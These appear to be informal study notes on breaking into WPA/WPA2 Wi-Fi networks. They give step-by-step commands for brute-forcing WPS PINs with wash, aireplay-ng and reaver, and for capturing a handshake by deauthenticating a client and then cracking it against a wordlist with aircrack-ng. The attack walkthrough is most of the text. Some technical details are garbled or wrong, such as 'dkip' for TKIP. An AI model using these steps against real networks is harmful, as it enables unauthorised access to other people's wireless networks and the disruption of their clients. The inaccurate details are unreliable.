WPA/WPA2:


WPA uses encryption dkip
WPA2 uses encryption ccmp,tkip

both the encryption came to overcome the problem of WEP

>Both can be cracked by using the same methods
>They are more secure
>  


>There is a feature called WPS
>If it is enabled then we can get into the network without
 cracking the key

WPS (wifi Protected Setup)
>WPS is a feature that can be used with WPA and WPA2
>Allows clients to connect without password
>Authentication is done using an 8 digit pin.
   >8 Digits is very small.
   >We can try all possible pins in relatively short time.
   >Then the wps pin can be used to compute the actual password.
PS: This only works if the router is configured not to use PBC(Push Button Authentication).


BEGIN:

>wash --interface wlan0(we use this command to display all the network arround us which has WPS enabled)
>aireplay-ng --fakeauth 30 -a (mac of router) -h (mac of usb) wlan0
>reaver --bssid (mac of target router) --channel () --interface wlan0 -vvv --no-associate
  (reaver bruteforce the possible pins) (-vvv is to say to show as much information as possible)


SECOND METHOD:

>it is made to overcome the weakness of wep.
>when the packets are transmitted,it dont contain any usefull data,as wep used to.
>We can crack the password by only capturing the handshake packets.
    These are 4 packets sent when a client connects to the network.
>the handshake packet is only used to check if the password is valid or not.

1>airodump-ng wlan0
2>airodump-ng --bssid () --channel () --write () wlan0
3>aireplay-ng --deauth 4 -a (router) -c (client) wlan0
  (after capturing the handshake)
   (we need to create a wordlist)

the handshake packets contains MIC(message intigrity code)
This MIC is used by the Router to verify the actual password
>Here aicrack-ng unpack the handshak packet 
>and match every password from our wordlist to all the data inside the MIC
>and form another MIC 
>and matches both the MIC,if both matches then the password is correct and if not
then it will move to the another password.

4>aircrack-ng (handsahake file) -w (wordlist)
